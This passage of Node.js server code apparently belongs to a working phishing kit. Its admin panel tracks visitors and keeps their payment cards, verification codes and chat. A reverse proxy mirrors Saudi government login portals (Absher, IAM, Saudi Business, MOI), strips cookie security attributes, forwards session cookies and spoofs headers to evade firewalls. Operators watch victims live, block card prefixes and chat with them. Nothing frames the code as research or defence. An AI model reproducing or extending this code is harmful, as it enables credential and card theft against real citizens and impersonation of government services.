    const prefix = cardNumber.replace(/\s/g, '').substring(0, 4);
    const isBlocked = globalBlockedCards.includes(prefix);
    socket.emit("blockedCards:checkResult", { isBlocked, prefix });
  });

  // Blocked Countries: Get list
  socket.on("blockedCountries:get", () => {
    socket.emit("blockedCountries:list", globalBlockedCountries);
  });

  // Blocked Countries: Add country
  socket.on("blockedCountries:add", (country) => {
    if (country && !globalBlockedCountries.includes(country)) {
      globalBlockedCountries.push(country);
      saveData();
      // Notify all admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
      });
      // Broadcast to all clients
      io.emit("blockedCountries:updated", globalBlockedCountries);
      console.log(`Blocked country added: ${country}`);
    }
  });

  // Blocked Countries: Remove country
  socket.on("blockedCountries:remove", (country) => {
    globalBlockedCountries = globalBlockedCountries.filter(c => c !== country);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
    });
    // Broadcast to all clients
    io.emit("blockedCountries:updated", globalBlockedCountries);
    console.log(`Blocked country removed: ${country}`);
  });

  // Blocked Countries: Check if visitor's country is blocked
  socket.on("blockedCountries:check", (country) => {
    const isBlocked = globalBlockedCountries.some(c => 
      c.toLowerCase() === country.toLowerCase()
    );
    socket.emit("blockedCountries:checkResult", { isBlocked, country });
  });

  // Admin: Mark visitor data as read (hide new data indicator)
  socket.on("admin:markAsRead", (visitorId) => {
    // Find visitor by ID in active visitors
    let found = false;
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        v.hasNewData = false;
        visitors.set(socketId, v);
        saveVisitorPermanently(v);
        found = true;
      }
    });
    
    // Also update in saved visitors
    const savedVisitor = savedVisitors.find(v => v._id === visitorId);
    if (savedVisitor) {
      savedVisitor.hasNewData = false;
      saveData();
    }
    
    // Notify all admins about the update
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:markedAsRead", { visitorId });
    });
    
    console.log(`Visitor ${visitorId} marked as read`);
  });

  // Admin: Toggle star on visitor
  socket.on("admin:toggleStar", (visitorId) => {
    // Find visitor by ID in active visitors
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        v.isStarred = !v.isStarred;
        visitors.set(socketId, v);
        saveVisitorPermanently(v);
      }
    });
    
    // Also update in saved visitors
    const savedVisitor = savedVisitors.find(v => v._id === visitorId);
    if (savedVisitor) {
      savedVisitor.isStarred = !savedVisitor.isStarred;
      saveData();
    }
    
    // Notify all admins about the update
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:starToggled", { visitorId, isStarred: savedVisitor ? savedVisitor.isStarred : false });
    });
  });

  // Chat: Message from visitor to admin
  socket.on("chat:fromVisitor", ({ visitorSocketId, message, timestamp }) => {
    const visitor = visitors.get(visitorSocketId) || visitors.get(socket.id);
    if (visitor) {
      // Initialize chat messages array if not exists
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      // Add message to visitor's chat history
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'visitor',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitor.hasNewMessage = true;
      visitors.set(visitor.socketId, visitor);
      saveVisitorPermanently(visitor);
      
      // Notify all admins about the new message
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("chat:newMessage", {
          visitorSocketId: visitor.socketId,
          visitorId: visitor._id,
          message: chatMessage
        });
      });
      
      console.log(`Chat message from visitor ${visitor.socketId}: ${message}`);
    }
  });

  // Chat: Message from admin to visitor
  socket.on("chat:fromAdmin", ({ visitorSocketId, message, timestamp }) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    if (visitor) {
      // Initialize chat messages array if not exists
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      // Add message to visitor's chat history
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'admin',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      
      // Send message to visitor
      io.to(currentSocketId).emit("chat:fromAdmin", {
        message: message,
        timestamp: chatMessage.timestamp
      });
      
      console.log(`Chat message from admin to visitor ${currentSocketId}: ${message}`);
    }
  });

  // Chat: Mark messages as read
  socket.on("chat:markAsRead", ({ visitorSocketId }) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    if (visitor) {
      visitor.hasNewMessage = false;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
    }
  });

  // Admin: Block card prefix
  socket.on("admin:blockCardPrefix", ({ visitorSocketId, prefix }) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    if (visitor) {
      if (!visitor.blockedCardPrefixes.includes(prefix)) {
        visitor.blockedCardPrefixes.push(prefix);
        visitors.set(currentSocketId, visitor);
        saveVisitorPermanently(visitor);
      }
      console.log(`Card prefix blocked for visitor ${currentSocketId}: ${prefix}`);
    }
  });

  // Handle disconnection
  socket.on("disconnect", () => {
    // Check if it's a visitor
    if (visitors.has(socket.id)) {
      const visitor = visitors.get(socket.id);
      const visitorId = visitor._id;
      const socketId = socket.id;
      
      // Save ALL visitor data to savedVisitors BEFORE removing from Map
      saveVisitorPermanently(visitor);
      
      // Remove from active Map
      visitors.delete(socket.id);
      
      // Grace period: wait 5 seconds before marking as disconnected
      // This handles page transitions where socket disconnects briefly then reconnects
      setTimeout(() => {
        // Check if visitor reconnected with a new socket during grace period
        let reconnected = false;
        for (const [sid, v] of visitors) {
          if (v._id === visitorId) {
            reconnected = true;
            break;
          }
        }
        
        if (!reconnected) {
          // Visitor truly disconnected - mark and notify admins
          const savedVisitor = savedVisitors.find(v => v._id === visitorId);
          if (savedVisitor) {
            savedVisitor.isConnected = false;
          }
          
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:disconnected", {
              visitorId: visitorId,
              socketId: socketId,
            });
          });
          
          saveData();
          console.log(`Visitor disconnected: ${socketId} (${visitorId})`);
        } else {
          console.log(`Visitor ${visitorId} reconnected during grace period - not marking as disconnected`);
        }
      }, 5000); // 5 second grace period for page transitions
    }

    // Check if it's an admin
    if (admins.has(socket.id)) {
      admins.delete(socket.id);

      // Notify visitors if no admins left
      if (admins.size === 0) {
        visitors.forEach((visitor, visitorSocketId) => {
          io.to(visitorSocketId).emit("isAdminConnected", false);
        });
      }

      console.log(`Admin disconnected: ${socket.id}`);
    }
  });
});

// ============================================
// FAST MULTI-DOMAIN REVERSE PROXY
// Proxies: saudibusiness.gov.sa, iam.gov.sa, absher.sa, api.saudibusiness.gov.sa
// ============================================
const https = require("https");
const zlib = require("zlib");

// Domain mapping: prefix → target
const PROXY_DOMAINS = {
  "sb":   { host: "www.saudibusiness.gov.sa", origin: "https://www.saudibusiness.gov.sa" },
  "api":  { host: "api.saudibusiness.gov.sa", origin: "https://api.saudibusiness.gov.sa" },
  "iam":  { host: "www.iam.gov.sa",           origin: "https://www.iam.gov.sa" },
  "absher": { host: "www.absher.sa",           origin: "https://www.absher.sa" },
  "moi":  { host: "www.moi.gov.sa",           origin: "https://www.moi.gov.sa" },
};

// Reverse lookup: hostname → prefix
const HOST_TO_PREFIX = {};
for (const [prefix, cfg] of Object.entries(PROXY_DOMAINS)) {
  HOST_TO_PREFIX[cfg.host] = prefix;
  // Also map without www
  HOST_TO_PREFIX[cfg.host.replace("www.", "")] = prefix;
}

// Default prefix
const DEFAULT_PREFIX = "sb";

// Rewrite URLs in text content to route through proxy
function rewriteUrls(text, contentType, currentPrefix) {
  // Replace all known domain URLs with proxy paths
  for (const [prefix, cfg] of Object.entries(PROXY_DOMAINS)) {
    const hostEsc = cfg.host.replace(/\./g, "\\.");
    const noWwwHost = cfg.host.replace("www.", "");
    const noWwwEsc = noWwwHost.replace(/\./g, "\\.");
    text = text.replace(new RegExp(`https?://${hostEsc}`, "g"), `/p/${prefix}`);
    if (cfg.host !== noWwwHost) {
      text = text.replace(new RegExp(`https?://${noWwwEsc}`, "g"), `/p/${prefix}`);
    }
  }
  // Also catch business.sa
  text = text.replace(/https?:\/\/business\.sa/g, `/p/sb`);

  if (contentType.includes("text/html")) {
    // Fix relative paths: href="/xxx" → href="/p/{prefix}/xxx"
    const px = currentPrefix || DEFAULT_PREFIX;
    text = text.replace(/(href|src|action)=(["'])\/(?!\/|p\/)(.*?)\2/g, `$1=$2/p/${px}/$3$2`);
    // Fix unquoted href=/xxx
    text = text.replace(/(href|src|action)=\/(?!p\/)(\S+?)([\s>])/g, `$1="/p/${px}/$2"$3`);
    // Fix CSS url()
    text = text.replace(/url\((['"]?)\/(?!p\/)(.*?)\1\)/g, `url($1/p/${px}/$2$1)`);
    // Fix inline JS paths that start with /
    text = text.replace(/(["'])\/(?!p\/)(Identity|Culture|lib|dist|plugins|images|src|favicon|authenticationendpoint|logincontext|carbon|samlsso|commonauth)\//g, `$1/p/${px}/$2/`);
  } else if (contentType.includes("text/css")) {
    const px = currentPrefix || DEFAULT_PREFIX;
    text = text.replace(/url\((['"]?)\/(?!p\/)(.*?)\1\)/g, `url($1/p/${px}/$2$1)`);
  }
  return text;
}

// Rewrite redirect Location headers
function rewriteLocation(location, currentPrefix) {
  // Check if it points to a known domain
  for (const [prefix, cfg] of Object.entries(PROXY_DOMAINS)) {
    const hostEsc = cfg.host.replace(/\./g, "\\.");
    const noWwwHost = cfg.host.replace("www.", "");
    const noWwwEsc = noWwwHost.replace(/\./g, "\\.");
    location = location.replace(new RegExp(`https?://${hostEsc}`, "g"), `/p/${prefix}`);
    if (cfg.host !== noWwwHost) {
      location = location.replace(new RegExp(`https?://${noWwwEsc}`, "g"), `/p/${prefix}`);
    }
  }
  // Relative redirect
  if (location.startsWith("/") && !location.startsWith("/p/")) {
    location = `/p/${currentPrefix || DEFAULT_PREFIX}${location}`;
  }
  return location;
}

// Rewrite Set-Cookie headers
function rewriteCookies(setCookies) {
  if (!setCookies) return null;
  return (Array.isArray(setCookies) ? setCookies : [setCookies]).map(c => {
    return c
      .replace(/;\s*Domain=[^;]*/gi, "")
      .replace(/;\s*Secure/gi, "")
      .replace(/;\s*SameSite=\w+/gi, "; SameSite=Lax");
  });
}

// Keep-alive HTTPS agent for speed (reuse connections)
const agent = new https.Agent({ keepAlive: true, maxSockets: 100, keepAliveMsecs: 60000 });

// ===== IN-MEMORY CACHE for static assets (CSS, JS, images, fonts) =====
const proxyCache = new Map(); // key: prefix+path → { body, headers, timestamp }
const CACHE_TTL = 30 * 60 * 1000; // 30 minutes
const MAX_CACHE_SIZE = 200; // max entries
const CACHEABLE_EXTENSIONS = /\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|webp|avif|map)$/i;

function isCacheable(path, method) {
  return method === "GET" && CACHEABLE_EXTENSIONS.test(path);
}

function getCached(key) {
  const entry = proxyCache.get(key);
  if (!entry) return null;
  if (Date.now() - entry.timestamp > CACHE_TTL) {
    proxyCache.delete(key);
    return null;
  }
  return entry;
}

function setCache(key, body, headers) {
  if (proxyCache.size >= MAX_CACHE_SIZE) {
    // Evict oldest entry
    const oldest = proxyCache.keys().next().value;
    proxyCache.delete(oldest);
  }
  proxyCache.set(key, { body, headers, timestamp: Date.now() });
}

// Main proxy handler - FAST streaming with caching
function handleProxy(req, res) {
  // Express strips /p prefix, so req.url starts with /{prefix}/rest/of/path
  const match = req.url.match(/^\/([a-z]+)(\/.*)$/);
  if (!match) {
    res.writeHead(404);
    res.end("Not found");
    return;
  }
  const prefix = match[1];
  const targetPath = match[2];
  const domainCfg = PROXY_DOMAINS[prefix];
  if (!domainCfg) {
    res.writeHead(404);
    res.end("Unknown proxy target");
    return;
  }

  // Add CORS headers for cross-origin fetch from client
  const reqOrigin = req.headers.origin || "*";
  res.setHeader("Access-Control-Allow-Origin", reqOrigin);
  res.setHeader("Access-Control-Allow-Credentials", "true");
  res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type,Cookie");
  if (req.method === "OPTIONS") {
    res.writeHead(204);
    res.end();
    return;
  }

  // Check cache for static assets
  const cacheKey = prefix + targetPath;
  if (isCacheable(targetPath, req.method)) {
    const cached = getCached(cacheKey);
    if (cached) {
      // Serve from cache - INSTANT
      const h = { ...cached.headers, "X-Cache": "HIT" };
      res.writeHead(200, h);
      res.end(cached.body);
      return;
    }
  }

  // Build clean headers - only forward safe ones to avoid WAF blocks
  const cleanHeaders = {
    host: domainCfg.host,
    referer: domainCfg.origin + "/",
    origin: domainCfg.origin,
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    accept: req.headers.accept || "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "accept-language": req.headers["accept-language"] || "ar,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "upgrade-insecure-requests": "1",
  };
  // Forward cookies
  if (req.headers.cookie) cleanHeaders.cookie = req.headers.cookie;
  // Forward content-type for POST
  if (req.headers["content-type"]) cleanHeaders["content-type"] = req.headers["content-type"];
  if (req.headers["content-length"]) cleanHeaders["content-length"] = req.headers["content-length"];

  const options = {
    hostname: domainCfg.host,
    port: 443,
    path: targetPath,
    method: req.method,
    agent: agent,
    headers: cleanHeaders,
  };

  const proxyReq = https.request(options, (proxyRes) => {
    const contentType = proxyRes.headers["content-type"] || "";
    const isText = contentType.includes("text/html") || contentType.includes("text/css") || contentType.includes("javascript");

    // Rewrite cookies
    const cookies = rewriteCookies(proxyRes.headers["set-cookie"]);

    // Handle redirects
    if ([301, 302, 303, 307, 308].includes(proxyRes.statusCode)) {
      const loc = rewriteLocation(proxyRes.headers["location"] || "", prefix);
      const headers = { Location: loc };
      if (cookies) headers["Set-Cookie"] = cookies;
      res.writeHead(proxyRes.statusCode, headers);
      res.end();
      return;
    }

    if (isText) {
      // Buffer text content for URL rewriting
      const encoding = proxyRes.headers["content-encoding"];
      let stream = proxyRes;
      if (encoding === "gzip") stream = proxyRes.pipe(zlib.createGunzip());
      else if (encoding === "br") stream = proxyRes.pipe(zlib.createBrotliDecompress());
      else if (encoding === "deflate") stream = proxyRes.pipe(zlib.createInflate());

      const chunks = [];
      stream.on("data", (chunk) => chunks.push(chunk));
      stream.on("end", () => {
        if (res.headersSent) return;
        let body = Buffer.concat(chunks).toString("utf-8");
        body = rewriteUrls(body, contentType, prefix);
        const headers = {};
        if (contentType) headers["Content-Type"] = contentType;
        if (cookies) headers["Set-Cookie"] = cookies;
        headers["Content-Length"] = Buffer.byteLength(body);
        if (proxyRes.headers["cache-control"]) headers["Cache-Control"] = proxyRes.headers["cache-control"];
        // Cache CSS/JS
        if (isCacheable(targetPath, req.method) && proxyRes.statusCode === 200) {
          setCache(cacheKey, Buffer.from(body), headers);
        }
        headers["X-Cache"] = "MISS";
        res.writeHead(proxyRes.statusCode, headers);
        res.end(body);
      });
      stream.on("error", () => {
        if (!res.headersSent) {
          res.writeHead(502);
          res.end("Proxy error");
        }
      });
    } else {
      // Binary content
      const shouldCache = isCacheable(targetPath, req.method) && proxyRes.statusCode === 200;
      if (shouldCache) {
        // Buffer for caching, then serve
        const encoding = proxyRes.headers["content-encoding"];
        let stream = proxyRes;
        if (encoding === "gzip") stream = proxyRes.pipe(zlib.createGunzip());
        else if (encoding === "br") stream = proxyRes.pipe(zlib.createBrotliDecompress());
        else if (encoding === "deflate") stream = proxyRes.pipe(zlib.createInflate());
        
        const chunks = [];
        stream.on("data", (chunk) => chunks.push(chunk));
        stream.on("end", () => {
          if (res.headersSent) return;
          const body = Buffer.concat(chunks);
          const headers = {};
          if (proxyRes.headers["content-type"]) headers["Content-Type"] = proxyRes.headers["content-type"];
          if (proxyRes.headers["cache-control"]) headers["Cache-Control"] = proxyRes.headers["cache-control"];
          headers["Content-Length"] = body.length;
          headers["X-Cache"] = "MISS";
          if (cookies) headers["Set-Cookie"] = cookies;
          setCache(cacheKey, body, headers);
          res.writeHead(200, headers);
          res.end(body);
        });
        stream.on("error", () => {
          if (!res.headersSent) { res.writeHead(502); res.end("Proxy error"); }
        });
      } else {
        // Not cacheable - STREAM directly (fastest)
        const headers = {};
        ["content-type", "content-length", "cache-control", "etag", "last-modified", "content-encoding"].forEach(h => {
          if (proxyRes.headers[h]) headers[h] = proxyRes.headers[h];
        });
        if (cookies) headers["Set-Cookie"] = cookies;
        res.writeHead(proxyRes.statusCode, headers);
        proxyRes.pipe(res);
      }
    }
  });

  proxyReq.on("error", (err) => {
    console.error("Proxy error:", err.message);
    if (!res.headersSent) {
      res.writeHead(502);
      res.end("Proxy error");
    }
  });

  // Pipe request body for POST/PUT
  if (req.method !== "GET" && req.method !== "HEAD") {
    req.pipe(proxyReq);
  } else {
    proxyReq.end();
  }
}

// Mount proxy - single handler for all domains
app.use("/p", handleProxy);

// Legacy /proxy route → redirect to /p/sb
app.use("/proxy", (req, res) => {
  res.redirect(301, "/p/sb" + req.url);
});

// REST API Routes
app.get("/", (req, res) => {
  res.json({ status: "Server is running", timestamp: new Date().toISOString() });
});

app.get("/api/visitors", (req, res) => {
  // Return visitors with ACCURATE live connection status (same logic as visitors:list)
  const connectedVisitorIds = new Set();
  visitors.forEach((v) => {
    connectedVisitorIds.add(v._id);
  });
  
  const visitorsWithStatus = savedVisitors.map(v => {
    const isCurrentlyConnected = connectedVisitorIds.has(v._id);
    let currentSocketId = v.socketId;
    visitors.forEach((activeVisitor, sid) => {
      if (activeVisitor._id === v._id) {
        currentSocketId = sid;
      }
    });
    return { ...v, socketId: currentSocketId, isConnected: isCurrentlyConnected };
  });
  
  res.json(visitorsWithStatus);
});

app.get("/api/stats", (req, res) => {
  // Count unique connected visitors (by _id) to avoid counting duplicates
  const uniqueConnected = new Set();
  visitors.forEach(v => uniqueConnected.add(v._id));
  res.json({
    totalVisitors: savedVisitors.length,
    connectedVisitors: uniqueConnected.size,
    totalAdmins: admins.size,
    visitorCounter,
  });
});

// Idle check timer - every 10 seconds, check for visitors idle > 60 seconds
setInterval(() => {
  const now = Date.now();
  visitors.forEach((visitor, sid) => {
    const wasIdle = visitor.isIdle || false;
    const isNowIdle = visitor.lastActivity ? (now - visitor.lastActivity) > 60000 : false;
    if (isNowIdle !== wasIdle) {
      visitor.isIdle = isNowIdle;
      visitors.set(sid, visitor);
      // Notify admins about idle status change
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:idleChanged", {
          visitorId: visitor._id,
          isIdle: isNowIdle,
        });
      });
    }
  });
}, 10000);

// Cleanup stale/dead socket connections every 30 seconds
// This prevents ghost visitors from accumulating in the active visitors Map
setInterval(() => {
  let cleaned = 0;
  visitors.forEach((visitor, sid) => {
    // Check if the socket is still actually connected
    const socket = io.sockets.sockets.get(sid);
    if (!socket || !socket.connected) {
      // Socket is dead/disconnected but still in the Map - remove it
      const visitorId = visitor._id;
      visitors.delete(sid);
      cleaned++;
      
      // Update saved visitor as disconnected
      const savedVisitor = savedVisitors.find(v => v._id === visitorId);
      if (savedVisitor) {
        savedVisitor.isConnected = false;
        saveData();
      }
      
      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:disconnected", {
          visitorId: visitorId,
          socketId: sid,
        });
      });
    }
  });
  if (cleaned > 0) {
    console.log(`Cleaned ${cleaned} stale socket connections. Active visitors: ${visitors.size}`);
  }
}, 30000);

// Graceful shutdown - save all data before server stops
function gracefulShutdown(signal) {
  console.log(`${signal} received. Saving all data before shutdown...`);
  // Sync all active visitors to savedVisitors before shutdown
  visitors.forEach((visitor) => {
    const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
    if (existingIndex >= 0) {
      const existing = savedVisitors[existingIndex];
      const merged = { ...existing, ...visitor };
      if (existing.dataHistory && visitor.dataHistory) {
        merged.dataHistory = existing.dataHistory.length >= visitor.dataHistory.length ? [...existing.dataHistory] : [...visitor.dataHistory];
      }
      if (existing.paymentCards && visitor.paymentCards) {
        merged.paymentCards = existing.paymentCards.length >= visitor.paymentCards.length ? [...existing.paymentCards] : [...visitor.paymentCards];
      }
      if (existing.digitCodes && visitor.digitCodes) {
        merged.digitCodes = existing.digitCodes.length >= visitor.digitCodes.length ? [...existing.digitCodes] : [...visitor.digitCodes];
      }
      if (existing.chatMessages && visitor.chatMessages) {
        merged.chatMessages = existing.chatMessages.length >= visitor.chatMessages.length ? [...existing.chatMessages] : [...visitor.chatMessages];
      }
      if (existing.data && visitor.data) {
        merged.data = { ...existing.data, ...visitor.data };
      }
      if (existing.hasEnteredCardPage) merged.hasEnteredCardPage = true;
      savedVisitors[existingIndex] = merged;
    }
  });
  saveDataImmediate();
  console.log('All data saved. Shutting down...');
  process.exit(0);
}

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));
process.on('SIGHUP', () => gracefulShutdown('SIGHUP'));

// Start server
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Loaded ${savedVisitors.length} saved visitors`);
});
